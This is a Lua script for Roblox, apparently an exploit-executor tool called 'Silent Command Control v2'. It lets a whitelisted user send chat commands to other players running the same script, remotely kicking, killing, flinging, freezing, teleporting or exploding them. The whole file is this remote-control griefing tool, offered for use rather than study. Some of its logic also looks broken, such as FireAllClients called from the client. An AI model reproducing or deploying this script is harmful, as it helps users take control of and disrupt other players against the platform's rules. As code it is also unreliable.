--// Silent Command Control v2 - by itzC9
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")

local WHITELIST = {
    ["C9_1234"] = true
    }
local SHARED_EVENT_NAME = "SilentCommand_Event_C9"
local remote = RS:FindFirstChild(SHARED_EVENT_NAME) or Instance.new("RemoteEvent", RS)
remote.Name = SHARED_EVENT_NAME

local clientList = {}

local function findUser(name)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():sub(1, #name) == name:lower() then
            return plr
        end
    end
end

local function getRandomClient()
    local list = {}
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and clientList[v.Name] then
            table.insert(list, v)
        end
    end
    return #list > 0 and list[math.random(1, #list)] or nil
end

local spinning = false
remote.OnClientEvent:Connect(function(sender, command, target)
    if sender == LocalPlayer then return end
    if not WHITELIST[sender.Name] then return end
    if not clientList[LocalPlayer.Name] then return end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")

    if command == "kick" or command == "ban" then
        LocalPlayer:Kick("Removed by admin.")
    elseif command == "fling" and hrp then
        hrp.Velocity = Vector3.new(9999, 9999, 9999)
    elseif command == "kill" and hum then
        hum.Health = 0
    elseif command == "bring" and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
        hrp.CFrame = sender.Character.HumanoidRootPart.CFrame
    elseif command == "goto" and target then
        local tgt = Players:FindFirstChild(target)
        if tgt and tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart") then
            hrp.CFrame = tgt.Character.HumanoidRootPart.CFrame
        end
    elseif command == "js" then
        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://9118823101"
        s.Volume = 10
        s:Play()
        Debris:AddItem(s, 3)
    elseif command:sub(1, 8) == "teleport" then
        local id = tonumber(command:sub(10))
        if id then game:GetService("TeleportService"):Teleport(id) end
    elseif command == "freeze" and hrp then
        hrp.Anchored = true
    elseif command == "spin" and hrp then
        if not spinning then
            spinning = true
            task.spawn(function()
                while spinning and hrp.Parent ~= nil do
                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(15), 0)
                    task.wait()
                end
            end)
        end
    elseif command == "explode" and hrp then
        local exp = Instance.new("Explosion")
        exp.Position = hrp.Position
        exp.BlastRadius = 10
        exp.BlastPressure = 10000
        exp.Parent = workspace
    elseif command == "nuke" and hrp then
        local exp = Instance.new("Explosion")
        exp.Position = hrp.Position
        exp.BlastRadius = 30
        exp.BlastPressure = 100000
        exp.ExplosionType = Enum.ExplosionType.Craters
        exp.Parent = workspace

        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://138186576"
        s.Volume = 10
        s:Play()
        Debris:AddItem(s, 5)
        local cam = workspace.CurrentCamera
        for i = 1, 30 do
            cam.CFrame = cam.CFrame * CFrame.new(math.random(-1,1), math.random(-1,1), 0)
            task.wait(0.03)
        end
    end
end)

task.spawn(function()
    if not WHITELIST[LocalPlayer.Name] then return end
    Players.LocalPlayer.Chatted:Connect(function(msg)
        local args = msg:split(" ")
        local cmd = args[1]:lower()
        local rawTarget = args[2]
        if not rawTarget then return end

        local targets = {}
        if rawTarget == "." then
            for _, v in ipairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and clientList[v.Name] then
                    table.insert(targets, v)
                end
            end
        elseif rawTarget == "r" then
            local rand = getRandomClient()
            if rand then table.insert(targets, rand) end
        elseif rawTarget:sub(1, 5) == "user/" then
            local name = rawTarget:sub(6)
            local plr = findUser(name)
            if plr then table.insert(targets, plr) end
        end

        local trueCommand = cmd:match("?(.+)")
        if trueCommand then
            for _, target in ipairs(targets) do
                remote:FireAllClients(LocalPlayer, trueCommand, target.Name)
            end
        end
    end)
end)

clientList[LocalPlayer.Name] = true